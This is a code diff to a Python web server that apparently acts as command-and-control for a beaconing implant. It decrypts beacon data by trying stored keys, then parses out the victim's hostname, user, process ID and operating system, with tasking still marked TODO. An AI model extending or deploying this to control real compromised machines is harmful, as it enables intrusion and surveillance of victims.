@@ -140,15 +140,20 @@ class WebServer(object):
                 # loops through each encryption key
                 # TO DO: look into using something other than row[0] to get encryption key
                 for row in results:
-                    print("trying key: " + row[0])
+                    # tries to decrypt using the current key
                     potentially_decrypted = self.crypt(row[0], self.data)
 
+                    # if successful decryption
                     if "hostname" in potentially_decrypted:
-                        # DEBUGGING
-                        print("successful decryption using key: " + row[0])
-                        print(potentially_decrypted)
+                        decrypted = potentially_decrypted
+                        
+                        # decodes json
+                        j = json.loads(decrypted)
 
-                        # TO DO: decode json
+                        hostname = j["hostname"]
+                        current_user = j["current_user"]
+                        process_id = j["process_id"]
+                        operating_system = j["operating_system"]
 
                         # TO DO: check for tasking for the beaconing implant
 
